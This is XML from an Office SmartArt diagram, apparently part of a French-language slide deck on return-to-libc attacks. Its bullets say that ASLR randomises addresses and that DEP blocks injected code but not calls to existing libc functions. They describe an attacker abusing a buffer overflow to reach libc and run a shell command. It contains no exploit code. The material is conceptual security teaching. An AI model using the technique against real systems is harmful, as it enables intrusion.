        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9CBD0495-74A0-429A-BD4A-F2A682237DED}" type="sibTrans" cxnId="{D1D2D90F-B6C7-4C7D-9210-31B03E143295}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9258CC4C-1E20-4529-B05E-541EC21D570F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Avec ASLR :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> Les adresses changent dynamiquement.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{EBE73E06-F727-4365-9095-4855629F43D2}" type="parTrans" cxnId="{0297942F-1E30-4F4D-BBD7-91F463992009}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{99F92F0E-4CEE-4499-BE8D-5FCDB79D145D}" type="sibTrans" cxnId="{0297942F-1E30-4F4D-BBD7-91F463992009}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5291A2BE-5CCE-204A-AD4A-444917660D46}" type="pres">
      <dgm:prSet presAssocID="{57B7FAFB-E706-4C1C-B9E6-7AC7F518316E}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{AB79C2B6-9494-614E-AFED-FD1C01B95837}" type="pres">
      <dgm:prSet presAssocID="{55CB279D-66FA-4AE8-941A-337A4FDDEB14}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A7BB649A-9E61-2C49-B2A7-03F899B48B6A}" type="pres">
      <dgm:prSet presAssocID="{55CB279D-66FA-4AE8-941A-337A4FDDEB14}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{23548921-A045-564B-A58B-25280CB303D6}" type="pres">
      <dgm:prSet presAssocID="{55CB279D-66FA-4AE8-941A-337A4FDDEB1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B440076-B6B4-E741-A575-37B37D272C8E}" type="pres">
      <dgm:prSet presAssocID="{55CB279D-66FA-4AE8-941A-337A4FDDEB14}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{9F08F2F8-4AE8-8841-91D2-6158CD104FF1}" type="pres">
      <dgm:prSet presAssocID="{55CB279D-66FA-4AE8-941A-337A4FDDEB14}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8A8842A8-E512-824B-8414-93FD96D856B2}" type="pres">
      <dgm:prSet presAssocID="{1ECB2072-73F2-460D-BC47-7E98896F801C}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7458076C-3165-BA43-A524-E4105493D57A}" type="pres">
      <dgm:prSet presAssocID="{87B332C9-04DB-4747-9364-5F7E2376D098}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{249896C3-DC50-F545-B762-C56EAC982C44}" type="pres">
      <dgm:prSet presAssocID="{87B332C9-04DB-4747-9364-5F7E2376D098}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8FB05076-E1EE-7645-8DF2-C0F4DCEE8538}" type="pres">
      <dgm:prSet presAssocID="{87B332C9-04DB-4747-9364-5F7E2376D09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06B4540-30B0-DF4C-9B9D-72310DBA3551}" type="pres">
      <dgm:prSet presAssocID="{87B332C9-04DB-4747-9364-5F7E2376D098}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{56CC6397-FCFD-3249-87A1-036C3AC3526F}" type="pres">
      <dgm:prSet presAssocID="{87B332C9-04DB-4747-9364-5F7E2376D098}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="1" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A45585E7-CD3A-D649-A2C7-A6005E98771E}" type="pres">
      <dgm:prSet presAssocID="{2ED9B7BB-F0FA-4BBE-AAAF-59319D5F3781}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5B2FDA20-74EA-8A40-A07A-DE0A265C4FA6}" type="pres">
      <dgm:prSet presAssocID="{AC1B10F7-19B3-4C3C-9B34-A9239884D7CF}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EFE44D90-9EB2-EB47-B7AC-58C9C6DBEC4D}" type="pres">
      <dgm:prSet presAssocID="{AC1B10F7-19B3-4C3C-9B34-A9239884D7CF}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8298FBC1-4264-4B4D-935D-F5BBD50F8319}" type="pres">
      <dgm:prSet presAssocID="{AC1B10F7-19B3-4C3C-9B34-A9239884D7C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4959119-3CA8-9245-8EB8-9E551A35EE9D}" type="pres">
      <dgm:prSet presAssocID="{AC1B10F7-19B3-4C3C-9B34-A9239884D7CF}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{6B54582D-0BD3-8F4F-BC04-98E015073B5B}" type="pres">
      <dgm:prSet presAssocID="{AC1B10F7-19B3-4C3C-9B34-A9239884D7C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1D2D90F-B6C7-4C7D-9210-31B03E143295}" srcId="{AC1B10F7-19B3-4C3C-9B34-A9239884D7CF}" destId="{147C9AED-B15D-40FC-8EDE-3FC29BC559C1}" srcOrd="0" destOrd="0" parTransId="{17E9441E-078B-4E29-987B-B813760D1FE5}" sibTransId="{9CBD0495-74A0-429A-BD4A-F2A682237DED}"/>
    <dgm:cxn modelId="{9505C117-EB45-418C-91EA-513E329BB5DA}" srcId="{57B7FAFB-E706-4C1C-B9E6-7AC7F518316E}" destId="{55CB279D-66FA-4AE8-941A-337A4FDDEB14}" srcOrd="0" destOrd="0" parTransId="{98775F55-AA49-4D6F-8989-593792F7214B}" sibTransId="{1ECB2072-73F2-460D-BC47-7E98896F801C}"/>
    <dgm:cxn modelId="{9BA18F1C-ABCC-8E47-B9C3-3088C706A430}" type="presOf" srcId="{87B332C9-04DB-4747-9364-5F7E2376D098}" destId="{8FB05076-E1EE-7645-8DF2-C0F4DCEE8538}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6E1B921D-DC12-44A1-8720-A265F26A1C64}" srcId="{87B332C9-04DB-4747-9364-5F7E2376D098}" destId="{16990B20-AF89-4A60-9C85-5888CC734242}" srcOrd="1" destOrd="0" parTransId="{1C051A8C-D83A-4E46-9162-5AE3A5E40450}" sibTransId="{D1F80E50-D746-4A7C-B145-FB35E693EB7B}"/>
    <dgm:cxn modelId="{107B3B22-504B-B54D-AB68-C59204CD3FF1}" type="presOf" srcId="{9258CC4C-1E20-4529-B05E-541EC21D570F}" destId="{6B54582D-0BD3-8F4F-BC04-98E015073B5B}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0297942F-1E30-4F4D-BBD7-91F463992009}" srcId="{AC1B10F7-19B3-4C3C-9B34-A9239884D7CF}" destId="{9258CC4C-1E20-4529-B05E-541EC21D570F}" srcOrd="1" destOrd="0" parTransId="{EBE73E06-F727-4365-9095-4855629F43D2}" sibTransId="{99F92F0E-4CEE-4499-BE8D-5FCDB79D145D}"/>
    <dgm:cxn modelId="{65EA5D38-DE1A-F14D-B751-058C19AC6A8A}" type="presOf" srcId="{147C9AED-B15D-40FC-8EDE-3FC29BC559C1}" destId="{6B54582D-0BD3-8F4F-BC04-98E015073B5B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{1460D23C-61FF-F048-9948-A08519DC9A51}" type="presOf" srcId="{AC1B10F7-19B3-4C3C-9B34-A9239884D7CF}" destId="{EFE44D90-9EB2-EB47-B7AC-58C9C6DBEC4D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{EC167E40-9EB3-684A-B505-E96BAE17C677}" type="presOf" srcId="{55CB279D-66FA-4AE8-941A-337A4FDDEB14}" destId="{23548921-A045-564B-A58B-25280CB303D6}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6300C847-4600-4B47-9DE6-E24AB1E00E94}" type="presOf" srcId="{16990B20-AF89-4A60-9C85-5888CC734242}" destId="{56CC6397-FCFD-3249-87A1-036C3AC3526F}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{65BAA648-D721-C246-AD5A-E984776A4609}" type="presOf" srcId="{1F865106-56BE-4488-B94D-3017DA64FFC9}" destId="{56CC6397-FCFD-3249-87A1-036C3AC3526F}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{31874A59-48E1-4B62-B36B-592FE701E314}" srcId="{57B7FAFB-E706-4C1C-B9E6-7AC7F518316E}" destId="{AC1B10F7-19B3-4C3C-9B34-A9239884D7CF}" srcOrd="2" destOrd="0" parTransId="{D9499FD9-C046-4266-B01A-9C65F3D13D15}" sibTransId="{2D309925-B81F-478E-BCBF-7CEE0D29C8FC}"/>
    <dgm:cxn modelId="{FDD99A62-D208-BC44-91D3-6BE47F302440}" type="presOf" srcId="{AC1B10F7-19B3-4C3C-9B34-A9239884D7CF}" destId="{8298FBC1-4264-4B4D-935D-F5BBD50F8319}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{75C4E165-F979-4707-BDC8-2DACDA83B032}" srcId="{57B7FAFB-E706-4C1C-B9E6-7AC7F518316E}" destId="{87B332C9-04DB-4747-9364-5F7E2376D098}" srcOrd="1" destOrd="0" parTransId="{27529180-9C6B-41E9-8C34-10906F4822FB}" sibTransId="{2ED9B7BB-F0FA-4BBE-AAAF-59319D5F3781}"/>
    <dgm:cxn modelId="{FF3CFB81-5942-584D-8C19-C93EBC46E837}" type="presOf" srcId="{87B332C9-04DB-4747-9364-5F7E2376D098}" destId="{249896C3-DC50-F545-B762-C56EAC982C44}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{953A4186-7ADB-014C-B6CC-62775C196112}" type="presOf" srcId="{55CB279D-66FA-4AE8-941A-337A4FDDEB14}" destId="{A7BB649A-9E61-2C49-B2A7-03F899B48B6A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F57802BB-48C3-4B7E-9620-3406F87B3B4F}" srcId="{87B332C9-04DB-4747-9364-5F7E2376D098}" destId="{1F865106-56BE-4488-B94D-3017DA64FFC9}" srcOrd="0" destOrd="0" parTransId="{C663E830-6941-4452-A939-E1243C9903FF}" sibTransId="{A84E81B4-2F78-4779-9137-D5936108389F}"/>
    <dgm:cxn modelId="{9A0AE2BD-5AEB-F640-A78A-68186B7D1935}" type="presOf" srcId="{57B7FAFB-E706-4C1C-B9E6-7AC7F518316E}" destId="{5291A2BE-5CCE-204A-AD4A-444917660D46}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{279CE4BF-C85A-0B4B-84A8-B91EC56B7057}" type="presParOf" srcId="{5291A2BE-5CCE-204A-AD4A-444917660D46}" destId="{AB79C2B6-9494-614E-AFED-FD1C01B95837}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{2C1C0DA4-08C7-9640-BDA9-43B6467BD26E}" type="presParOf" srcId="{AB79C2B6-9494-614E-AFED-FD1C01B95837}" destId="{A7BB649A-9E61-2C49-B2A7-03F899B48B6A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{97BD18F4-0ED6-4141-81EB-E2FD2267362F}" type="presParOf" srcId="{AB79C2B6-9494-614E-AFED-FD1C01B95837}" destId="{23548921-A045-564B-A58B-25280CB303D6}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{49989112-6CFA-2748-A685-D36F31630626}" type="presParOf" srcId="{5291A2BE-5CCE-204A-AD4A-444917660D46}" destId="{EB440076-B6B4-E741-A575-37B37D272C8E}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{551C00F5-0686-0D41-AC2A-F429B6A1440B}" type="presParOf" srcId="{5291A2BE-5CCE-204A-AD4A-444917660D46}" destId="{9F08F2F8-4AE8-8841-91D2-6158CD104FF1}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{5F41957E-5D4D-8640-9468-6071E481278F}" type="presParOf" srcId="{5291A2BE-5CCE-204A-AD4A-444917660D46}" destId="{8A8842A8-E512-824B-8414-93FD96D856B2}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{BCCE39D5-2AD7-4347-A32E-07BD2523E894}" type="presParOf" srcId="{5291A2BE-5CCE-204A-AD4A-444917660D46}" destId="{7458076C-3165-BA43-A524-E4105493D57A}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{37534E0D-6815-DC43-80D0-036ED1AE4D7D}" type="presParOf" srcId="{7458076C-3165-BA43-A524-E4105493D57A}" destId="{249896C3-DC50-F545-B762-C56EAC982C44}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{032EABEC-AFE7-124E-83AF-E302D8B61057}" type="presParOf" srcId="{7458076C-3165-BA43-A524-E4105493D57A}" destId="{8FB05076-E1EE-7645-8DF2-C0F4DCEE8538}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F7ECD74F-97E9-1846-AAC7-290DA96DB638}" type="presParOf" srcId="{5291A2BE-5CCE-204A-AD4A-444917660D46}" destId="{C06B4540-30B0-DF4C-9B9D-72310DBA3551}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{EB27BE07-8A7A-D84F-A0E1-A1A8AE7FEBD6}" type="presParOf" srcId="{5291A2BE-5CCE-204A-AD4A-444917660D46}" destId="{56CC6397-FCFD-3249-87A1-036C3AC3526F}" srcOrd="6" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0FEF1AA7-1FAA-AA47-905D-E8083E97FD31}" type="presParOf" srcId="{5291A2BE-5CCE-204A-AD4A-444917660D46}" destId="{A45585E7-CD3A-D649-A2C7-A6005E98771E}" srcOrd="7" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{CD36EA30-47AA-7447-85D1-61CBAE2A37F7}" type="presParOf" srcId="{5291A2BE-5CCE-204A-AD4A-444917660D46}" destId="{5B2FDA20-74EA-8A40-A07A-DE0A265C4FA6}" srcOrd="8" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{75F00DD4-F7A6-D34B-B261-23BB1ACA8850}" type="presParOf" srcId="{5B2FDA20-74EA-8A40-A07A-DE0A265C4FA6}" destId="{EFE44D90-9EB2-EB47-B7AC-58C9C6DBEC4D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{183F598F-0E18-A042-A097-EEE09080B67F}" type="presParOf" srcId="{5B2FDA20-74EA-8A40-A07A-DE0A265C4FA6}" destId="{8298FBC1-4264-4B4D-935D-F5BBD50F8319}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8D7184DD-7CFA-EB44-84EB-3DED8928B99F}" type="presParOf" srcId="{5291A2BE-5CCE-204A-AD4A-444917660D46}" destId="{F4959119-3CA8-9245-8EB8-9E551A35EE9D}" srcOrd="9" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{A1F80F7F-B9B1-3A4C-BA77-FA2FAEA88CD9}" type="presParOf" srcId="{5291A2BE-5CCE-204A-AD4A-444917660D46}" destId="{6B54582D-0BD3-8F4F-BC04-98E015073B5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0AE17A9A-7B94-468F-8A13-C9158C5A903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43F8BEE-4FC1-4C32-A420-3C730513CD8C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Problème adressé par l'attaque :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7B3043BC-3FE6-4AB3-AB3C-584A1A9FDDE7}" type="parTrans" cxnId="{B51578BB-E632-4CC9-8303-78CE15A067C3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{468D8CB9-AC12-4EA6-9D9E-DC04133E7E44}" type="sibTrans" cxnId="{B51578BB-E632-4CC9-8303-78CE15A067C3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1F317220-9E0F-403B-9227-154E8BE916B4}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Les mécanismes modernes comme DEP (Data Execution Prevention) empêchent d'exécuter du code injecté dans la pile ou le tas.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7EFD83D6-5E4F-4511-A261-A3270DA050CB}" type="parTrans" cxnId="{0278666A-5617-41A7-8BF2-DC629F4615EA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{57560A40-5709-4A0D-828D-DB53637C0A0B}" type="sibTrans" cxnId="{0278666A-5617-41A7-8BF2-DC629F4615EA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{36EC3767-E807-4E78-B463-E581F750A17B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Cependant, ces mécanismes n'empêchent pas d'appeler des fonctions légitimes existantes (comme celles de la libc).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F476B247-192F-4B66-A8B1-48F513B00C72}" type="parTrans" cxnId="{6EA1FBF7-3D13-48AD-9D88-1A1FC6EB8D35}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{49CCA11E-5164-4C2D-9C83-9A5D776C8FCF}" type="sibTrans" cxnId="{6EA1FBF7-3D13-48AD-9D88-1A1FC6EB8D35}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{338EE4EE-989A-48A9-8C4C-0900B42AF235}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Objectif de l'attaquant :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Exploiter une vulnérabilité (souvent un débordement de tampon) pour manipuler le contrôle du programme et appeler des fonctions libc, par exemple, pour exécuter une commande shell.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E56D4090-BEFE-4479-95F2-A13E5E9CFEB8}" type="parTrans" cxnId="{C1CCCD30-4617-4452-A58D-050EDC6267E6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0490FF7D-EA01-4346-BF8D-C23474955C8C}" type="sibTrans" cxnId="{C1CCCD30-4617-4452-A58D-050EDC6267E6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B3478384-6979-444B-845B-EB78AD96AA85}" type="pres">
      <dgm:prSet presAssocID="{0AE17A9A-7B94-468F-8A13-C9158C5A903C}" presName="outerComposite" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:chMax val="5"/>
          <dgm:dir/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B51E74BC-7665-AA4A-9F53-3D750D1E81BD}" type="pres">
      <dgm:prSet presAssocID="{0AE17A9A-7B94-468F-8A13-C9158C5A903C}" presName="dummyMaxCanvas" presStyleCnt="0">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5D48E36C-F0C2-8440-B362-77306D726176}" type="pres">
      <dgm:prSet presAssocID="{0AE17A9A-7B94-468F-8A13-C9158C5A903C}" presName="TwoNodes_1" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{79D77F75-AE2F-B247-93FB-F1EA6A36604B}" type="pres">
      <dgm:prSet presAssocID="{0AE17A9A-7B94-468F-8A13-C9158C5A903C}" presName="TwoNodes_2" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E390C19A-D785-BB48-A164-B71F7F8E3549}" type="pres">
      <dgm:prSet presAssocID="{0AE17A9A-7B94-468F-8A13-C9158C5A903C}" presName="TwoConn_1-2" presStyleLbl="fgAccFollowNode1" presStyleIdx="0" presStyleCnt="1">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C7FA961D-A5FC-174E-B189-F518A9C26F4E}" type="pres">
      <dgm:prSet presAssocID="{0AE17A9A-7B94-468F-8A13-C9158C5A903C}" presName="TwoNodes_1_text" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{771523E3-4E65-3F42-B934-74A896B95EB4}" type="pres">
      <dgm:prSet presAssocID="{0AE17A9A-7B94-468F-8A13-C9158C5A903C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BFC36427-396E-9142-9AAF-FCB6AA4514D5}" type="presOf" srcId="{338EE4EE-989A-48A9-8C4C-0900B42AF235}" destId="{771523E3-4E65-3F42-B934-74A896B95EB4}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{C1CCCD30-4617-4452-A58D-050EDC6267E6}" srcId="{0AE17A9A-7B94-468F-8A13-C9158C5A903C}" destId="{338EE4EE-989A-48A9-8C4C-0900B42AF235}" srcOrd="1" destOrd="0" parTransId="{E56D4090-BEFE-4479-95F2-A13E5E9CFEB8}" sibTransId="{0490FF7D-EA01-4346-BF8D-C23474955C8C}"/>
    <dgm:cxn modelId="{0BB7F335-70ED-5D43-B71B-BC14E8B521C4}" type="presOf" srcId="{543F8BEE-4FC1-4C32-A420-3C730513CD8C}" destId="{C7FA961D-A5FC-174E-B189-F518A9C26F4E}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{3942CE3A-3E86-5D4C-A5FD-B5476B94FACD}" type="presOf" srcId="{36EC3767-E807-4E78-B463-E581F750A17B}" destId="{C7FA961D-A5FC-174E-B189-F518A9C26F4E}" srcOrd="1" destOrd="2" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{59D6AE50-BFC3-834E-A203-9F2B43040358}" type="presOf" srcId="{338EE4EE-989A-48A9-8C4C-0900B42AF235}" destId="{79D77F75-AE2F-B247-93FB-F1EA6A36604B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{540E1F62-B174-5E41-86E2-D65CB37E0D95}" type="presOf" srcId="{468D8CB9-AC12-4EA6-9D9E-DC04133E7E44}" destId="{E390C19A-D785-BB48-A164-B71F7F8E3549}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{0278666A-5617-41A7-8BF2-DC629F4615EA}" srcId="{543F8BEE-4FC1-4C32-A420-3C730513CD8C}" destId="{1F317220-9E0F-403B-9227-154E8BE916B4}" srcOrd="0" destOrd="0" parTransId="{7EFD83D6-5E4F-4511-A261-A3270DA050CB}" sibTransId="{57560A40-5709-4A0D-828D-DB53637C0A0B}"/>
    <dgm:cxn modelId="{650DE56A-26E6-9348-8CFE-A4048401C14C}" type="presOf" srcId="{36EC3767-E807-4E78-B463-E581F750A17B}" destId="{5D48E36C-F0C2-8440-B362-77306D726176}" srcOrd="0" destOrd="2" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{5A7EF379-0770-F44E-95F5-5F989FF45DFD}" type="presOf" srcId="{1F317220-9E0F-403B-9227-154E8BE916B4}" destId="{5D48E36C-F0C2-8440-B362-77306D726176}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
    <dgm:cxn modelId="{ED98E77F-D835-4A4F-A0C3-05B7ED302501}" type="presOf" srcId="{543F8BEE-4FC1-4C32-A420-3C730513CD8C}" destId="{5D48E36C-F0C2-8440-B362-77306D726176}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5"/>
